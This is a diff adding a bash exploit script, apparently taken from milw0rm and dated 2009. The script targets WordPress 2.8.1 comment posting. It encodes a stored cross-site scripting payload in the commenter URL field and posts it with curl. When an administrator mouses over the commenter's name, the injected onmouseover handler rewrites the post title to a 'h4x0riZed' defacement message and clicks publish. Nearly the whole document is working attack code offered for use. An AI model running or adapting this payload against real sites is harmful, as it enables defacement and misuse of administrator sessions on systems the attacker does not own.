@@ -1,0 +1,38 @@
+#!/bin/bash
+
+echo "wp281.quickprz // iso^kpsbr"
+
+SITE=$1
+COMMENT=$2
+MESSAGE="h4x0riZed by the superfreakaz0rz"
+
+if [ "X$SITE" = "X" ]; then
+	echo "$0 <url> [postID]"
+	echo "f.e. $0 www.worstpress.eu"
+	exit
+fi
+
+if [ "X$POSTID" = "X" ]; then
+	POSTID=1
+fi
+
+
+echo "[+] building payload"
+
+WHERE="title" # can also be 'content'
+PATH="$SITE/wp-comments-post.php"
+
+WHERE=`echo -n "$WHERE" | /usr/bin/od -t d1 -A n | /bin/sed 's/\\s\\s*/,/g' | /bin/sed 's/^,//'`
+EVILURL="http://w.ch'onmouseover='document.getElementById(String.fromCharCode($WHERE)).value=this.innerHTML;document.getElementById(String.fromCharCode(112,117,98,108,105,115,104)).click();"
+echo "[-] payload is $EVILURL for '$MESSAGE'"
+
+EVILURL=`echo -n "$EVILURL" | /usr/bin/od -t x1 -A n | /usr/bin/tr " " %`
+MESSAGE=`echo -n "$MESSAGE" | /usr/bin/od -t x1 -A n | /usr/bin/tr " " %`
+RNDDATA=`/bin/date +%S%s`;
+
+echo "[!] delivering data"
+/usr/bin/curl -A "Quickprz" -d "author=$MESSAGE&email=kelly@hackforums.net&url=$EVILURL&comment=hi+there%5F+this+is+just+some+very+harmless+spam+$RNDDATA&submit=Submit+Comment&comment_post_ID=$POSTID" $PATH
+
+echo "[X] all done. now wait for admin to mouse-over that name."
+
+# milw0rm.com [2009-07-24]
